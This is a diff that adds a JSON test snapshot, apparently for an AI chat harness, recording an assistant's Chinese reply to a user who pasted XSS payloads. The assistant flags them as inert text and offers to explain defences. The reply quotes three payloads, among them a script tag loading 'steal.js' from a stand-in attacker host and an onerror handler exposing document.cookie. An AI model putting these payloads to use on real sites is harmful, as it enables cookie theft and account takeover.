@@ -1,0 +1,17 @@
+{
+  "invariants": {
+    "toolUseResultPairsComplete": true,
+    "eventLifecycleValid": true,
+    "noRealToolExecution": true,
+    "toolInputsSchemaValid": true
+  },
+  "normalizedSnapshot": {
+    "finalAssistantText": "我注意到你输入的内容包含 XSS（跨站脚本攻击）相关的脚本标签。这些脚本**不会被执行**——它们被当作纯文本数据处理，系统有相应的安全防护机制。\n\n你输入的内容包括：\n- `<script>alert('xss攻击')</script>`\n- `<script src=\"http://hack.com/steal.js\"></script>`\n- `<img src=x onerror=alert(document.cookie)>`\n\n请问你的真实意图是什么？\n\n- 如果你是在**测试安全性**，我已经告诉你这些脚本会被安全过滤，不会执行。\n- 如果你是在**学习/了解 XSS**，我可以帮你讲解 XSS 攻击原理和防御措施。\n- 如果你是在**尝试其他操作**，请重新描述你的需求，我会尽力协助。\n\n安全提示：在任何真实系统中，都不要随意执行或测试未授权的攻击脚本，这可能导致法律风险和账号封禁。",
+    "messagesShape": [
+      "user:user_input",
+      "user:user_input",
+      "assistant:history"
+    ],
+    "toolCalls": []
+  }
+}
